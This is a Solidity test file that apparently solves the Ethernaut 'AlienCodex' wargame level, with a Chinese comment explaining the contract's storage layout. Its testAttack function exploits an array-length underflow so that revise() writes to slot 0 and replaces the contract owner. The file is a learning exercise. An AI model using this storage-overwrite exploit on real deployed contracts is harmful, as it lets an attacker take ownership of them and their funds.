// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {AlienCodex} from "../src/AlienCodex.sol";

/* 
storage layout
slot0 owner(20bytes) contact(1 bytes)
slot1 codex's length

h = keccak256(1)
slot h                  -  codex[0]
slot h +1               -  codex[1]
slot h +2               -  codex[2]
slot h +3               -  codex[3]
...
slot h + 2**256 - 1     -  codex[2**256 - 1]

keccak256(slot) + index, 此时 codex数组在槽1上 slot=1
owner在0槽上, 为了让最后的结果变成 0(owner的slot) 需要以下条件
keccak256(1) + index = 2**256 => 
index = 2^256 - keccak256(1)
也就是说此index会将目标锁定到 0槽位上 把整个owner覆盖 contact也会变成初始状态 false
*/

contract AlienCodexTest {
    AlienCodex public ali;

    constructor() public {
        ali = new AlienCodex();
    }

    function testAttack() public {
        require(ali.owner() == address(this), "Init fail");

        ali.makeContact();
        ali.retract();

        address alice = address(1);

        uint256 index = 0 - uint256(keccak256(abi.encodePacked(uint256(1))));
        bytes32 bytes32Addr = bytes32(uint256(uint160(alice)));
        ali.revise(index, bytes32Addr);

        require(ali.owner() == alice, "hack fail");
    }
}
